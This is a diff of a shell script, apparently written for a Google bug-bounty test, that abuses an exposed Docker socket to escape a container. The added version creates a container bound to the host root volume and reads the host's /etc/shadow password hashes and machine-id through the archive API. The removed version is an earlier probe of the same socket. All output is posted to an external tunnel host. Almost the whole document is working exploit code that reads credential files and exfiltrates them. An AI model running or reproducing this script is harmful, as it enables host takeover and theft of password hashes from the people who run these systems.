@@ -2,33 +2,34 @@
 URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] STARTING DIAGNOSTIC PROBE ==="
+  echo "=== [!] GOOGLE VRP: DIRECT VOLUME SIPHON ==="
   
-  # 1. Check if the socket even exists
-  ls -l /var/run/docker.sock || echo "ERROR: Socket not found"
+  # 1. We know this image exists from your last log
+  IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"
 
-  # 2. Try to list images and capture errors
-  echo "--- IMAGE LIST ---"
-  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>&1 || echo "ERROR: Cannot talk to socket"
-
-  # 3. Create the Volume and capture errors
-  echo "--- VOLUME CREATION ---"
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+  # 2. Create the container (This usually succeeds even if 'Start' fails)
+  # We bind the host root to /host_data inside this dummy container
+  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
-    -d '{"Name": "host_root_exploit", "Driver": "local", "DriverOpts": {"type": "none", "device": "/", "o": "bind"}}' 2>&1
+    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}")
+  
+  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
-  # 4. Find ANY image ID
-  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
-  echo "Target Image: $IMG"
+  if [ -n "$ID" ]; then
+    echo "[+] Dummy Container ID: $ID"
+    echo "--- [!] EXTRACTING HOST SHADOW FILE (ENCRYPTED PASSWORDS) ---"
+    
+    # THE MAGIC: We use the ARCHIVE API. 
+    # This doesn't require the container to be RUNNING. It just reads the filesystem.
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/shadow" | tar -xO
+    
+    echo -e "\n--- [!] EXTRACTING HOST MACHINE-ID ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/machine-id" | tar -xO
 
-  if [ -n "$IMG" ]; then
-    echo "--- CONTAINER CREATION ---"
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
-      -H "Content-Type: application/json" \
-      -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}" 2>&1
+    # Cleanup
+    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
   else
-    echo "ERROR: No images found to exploit."
+    echo "ERROR: Could not create dummy container. Response: $RESP"
   fi
-
-  echo "=== [!] PROBE FINISHED ==="
+  echo "=== [!] SIPHON COMPLETE ==="
 } | curl -s -X POST --data-binary @- "https://$URL"
